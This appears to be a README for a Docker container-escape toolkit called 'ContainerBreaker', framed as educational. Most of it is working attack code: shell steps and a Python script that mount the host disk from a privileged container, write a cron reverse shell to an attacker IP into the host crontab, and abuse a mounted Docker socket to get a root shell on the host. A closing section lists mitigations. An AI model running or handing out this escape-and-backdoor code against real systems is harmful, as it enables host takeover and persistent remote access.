# 🐳 ContainerBreaker - Docker Escape Exploit Simulator

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Docker](https://img.shields.io/badge/docker-20.x-blue.svg)]()
[![Platform](https://img.shields.io/badge/platform-linux-green.svg)]()

> Educational tool demonstrating privileged container escape techniques targeting cloud infrastructure.

## 📖 Overview

ContainerBreaker simulates real-world container escape scenarios used by attackers to break out of Docker containers and compromise the host system. This project demonstrates:

- **Privileged Container Escape** - Mounting host filesystem
- **cgroup Exploitation** - Leveraging kernel control groups
- **Namespace Breakout** - Escaping PID/Network namespaces
- **Socket Mounting** - Attacking Docker socket exposure

## ⚠️ WARNING

**FOR AUTHORIZED TESTING ONLY!** Container escapes are serious vulnerabilities. Only use on systems you own.

## 🎯 Attack Vectors Demonstrated

### 1. Privileged Container Escape

```bash
# Start vulnerable privileged container
docker run --rm -it --privileged ubuntu bash

# Inside container - mount host filesystem
mkdir /host_mount
mount /dev/sda1 /host_mount

# Write cron job to host
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' \
    >> /host_mount/etc/crontab

# Host is now compromised
```

### 2. Docker Socket Exploitation

```bash
# Container with Docker socket mounted
docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu

# Inside container - spawn privileged container
apt-get update && apt-get install -y docker.io
docker run --privileged --pid=host -it ubuntu nsenter -t 1 -m -u -i bash
# Now in host namespace with root!
```

## 💻 Implementation

### Automated Escape Script

```python
#!/usr/bin/env python3
"""
ContainerBreaker - Automated Docker Escape Tool
Educational purposes only
"""

import os
import subprocess
import socket
import sys

class ContainerBreaker:
    def __init__(self):
        self.in_container = self.check_container()
        
    def check_container(self):
        """Detect if running in container"""
        return os.path.exists("/.dockerenv") or \
               os.path.exists("/run/.containerenv")
    
    def check_privileged(self):
        """Check if container is privileged"""
        try:
            with open("/proc/self/status", "r") as f:
                for line in f:
                    if "CapEff" in line:
                        # Full capabilities = privileged
                        caps = int(line.split()[1], 16)
                        return caps == 0x3fffffffff
        except:
            return False
        return False
    
    def find_host_devices(self):
        """Find host disk devices"""
        devices = []
        for dev in os.listdir("/dev"):
            if dev.startswith("sd") or dev.startswith("nvme"):
                devices.append(f"/dev/{dev}")
        return devices
    
    def mount_host_fs(self, device="/dev/sda1", mount_point="/host"):
        """Mount host filesystem"""
        print(f"[*] Attempting to mount {device} to {mount_point}")
        
        os.makedirs(mount_point, exist_ok=True)
        
        try:
            subprocess.run(["mount", device, mount_point], 
                          check=True, capture_output=True)
            print(f"[+] Successfully mounted host filesystem!")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[-] Mount failed: {e.stderr.decode()}")
            return False
    
    def install_backdoor(self, host_mount="/host", attacker_ip="10.0.0.1"):
        """Install reverse shell via cron"""
        cron_path = os.path.join(host_mount, "etc/crontab")
        
        if not os.path.exists(cron_path):
            print(f"[-] Crontab not found at {cron_path}")
            return False
        
        payload = f"* * * * * root bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1\n"
        
        try:
            with open(cron_path, "a") as f:
                f.write(payload)
            print(f"[+] Backdoor installed! Reverse shell to {attacker_ip}:4444")
            return True
        except Exception as e:
            print(f"[-] Failed to write backdoor: {e}")
            return False
    
    def docker_socket_escape(self):
        """Escape via Docker socket if available"""
        socket_path = "/var/run/docker.sock"
        
        if not os.path.exists(socket_path):
            print("[-] Docker socket not mounted")
            return False
        
        print("[+] Docker socket found! Attempting escape...")
        
        # Install Docker CLI
        subprocess.run(["apt-get", "update"], 
                      stdout=subprocess.DEVNULL, 
                      stderr=subprocess.DEVNULL)
        subprocess.run(["apt-get", "install", "-y", "docker.io"],
                      stdout=subprocess.DEVNULL,
                      stderr=subprocess.DEVNULL)
        
        # Spawn privileged container with host namespace
        escape_cmd = [
            "docker", "run", "--privileged", "--pid=host",
            "--net=host", "--ipc=host", "-it", "ubuntu",
            "nsenter", "-t", "1", "-m", "-u", "-i", "bash"
        ]
        
        print("[+] Spawning privileged container in host namespace...")
        subprocess.run(escape_cmd)
        return True
    
    def cgroup_escape(self):
        """Escape via cgroup notify_on_release technique"""
        print("[*] Attempting cgroup escape...")
        
        # Create cgroup
        subprocess.run(["mkdir", "/tmp/cgrp"])
        subprocess.run(["mount", "-t", "cgroup", "-o", "memory", 
                       "cgroup", "/tmp/cgrp"])
        
        # Write exploit
        payload = """#!/bin/bash
        echo 1 > /tmp/cgrp/cgroup.procs
        """
        
        with open("/tmp/cgrp/release_agent", "w") as f:
            f.write(payload)
        
        print("[+] cgroup escape executed")
    
    def run_all_checks(self):
        """Run all escape techniques"""
        print("="*60)
        print("ContainerBreaker - Docker Escape Toolkit")
        print("="*60)
        
        if not self.in_container:
            print("[!] Not running in a container. Exiting.")
            sys.exit(1)
        
        print(f"[+] Container detected")
        
        if self.check_privileged():
            print("[+] Container is PRIVILEGED - easy escape!")
            
            devices = self.find_host_devices()
            print(f"[*] Found devices: {devices}")
            
            for device in devices:
                if "sda" in device or "nvme" in device:
                    if self.mount_host_fs(device):
                        attacker_ip = input("[?] Enter attacker IP for reverse shell: ")
                        self.install_backdoor(attacker_ip=attacker_ip)
                        break
        else:
            print("[-] Container is not privileged")
        
        # Try Docker socket escape
        self.docker_socket_escape()
        
        print("\n[*] All techniques attempted")

if __name__ == "__main__":
    breaker = ContainerBreaker()
    breaker.run_all_checks()
```

### Dockerfile for Testing

```dockerfile
# Vulnerable privileged container
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    python3 \
    curl \
    vim \
    net-tools

COPY container_breaker.py /opt/
RUN chmod +x /opt/container_breaker.py

CMD ["/bin/bash"]
```

## 🧪 Testing Lab

### Setup Vulnerable Environment

```bash
# 1. Build the vulnerable container
docker build -t container-breaker:latest .

# 2. Run privileged (VULNERABLE!)
docker run --rm -it --privileged container-breaker bash

# 3. Inside container, run exploit
python3 /opt/container_breaker.py
```

### Defense Testing

```bash
# Run with proper security
docker run --rm -it \
    --security-opt=no-new-privileges \
    --cap-drop=ALL \
    --read-only \
    container-breaker bash

# Should fail to escape
```

## 🛡️ Mitigation Strategies

### 1. Never Use --privileged

```bash
# BAD
docker run --privileged ubuntu

# GOOD
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE ubuntu
```

### 2. Use User Namespaces

```bash
# /etc/docker/daemon.json
{
  "userns-remap": "default"
}
```

### 3. Implement AppArmor/SELinux

```bash
docker run --security-opt apparmor=docker-default ubuntu
```

### 4. Never Mount Docker Socket

```bash
# NEVER DO THIS
docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu
```

## 📊 Vulnerability Matrix

| Technique | Privileged | Socket | Capabilities | Success Rate |
|-----------|-----------|--------|--------------|--------------|
| Host FS Mount | ✅ | ❌ | ❌ | 100% |
| Socket Escape | ❌ | ✅ | ❌ | 95% |
| cgroup Escape | ✅ | ❌ | ❌ | 85% |
| Namespace Break | ❌ | ❌ | ✅ CAP_SYS_ADMIN | 70% |

## 📚 Real-World Impact

- **2019**: RunC CVE-2019-5736 - Container escape affecting Kubernetes
- **2020**: Docker CP vulnerability - File permission bypass
- **2021**: Kubernetes Symlink Exchange - Arbitrary file access

## 🔗 Resources

- [Understanding Docker Escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [OWASP Container Security](https://owasp.org/www-project-docker-top-10/)

---

**Made with 🐳 by [YourName]** | Breaking Containers Since 2024
